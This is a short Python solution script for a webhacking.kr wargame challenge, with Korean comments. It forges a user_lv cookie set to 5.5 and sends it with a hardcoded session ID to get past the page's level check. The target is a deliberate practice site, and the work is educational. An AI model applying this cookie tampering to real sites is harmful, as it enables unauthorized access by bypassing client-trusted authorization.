#problem : http://webhacking.kr/challenge/web/web-01/

import urllib.request
import re


#로그인 한 세션ID 설정
phpsessid = "45891863b038755822419f7e27b9718d"

# 소스코드 확인하면 level x 가 5<x<=6 사이의 값으로 설정해야 solve 할 수 이음
level = 5.5
# 1.URL오픈
req=urllib.request.Request("http://webhacking.kr/challenge/web/web-01/")
# 2.URL헤더를 수정
req.add_header('Cookie',"user_lv=%s; PHPSESSID=%s" %(level,phpsessid))
# 3.수정한 헤더를 넣고 다시 페이지 오픈 하면 성공!!
html=urllib.request.urlopen(req).read().decode()
print(html)
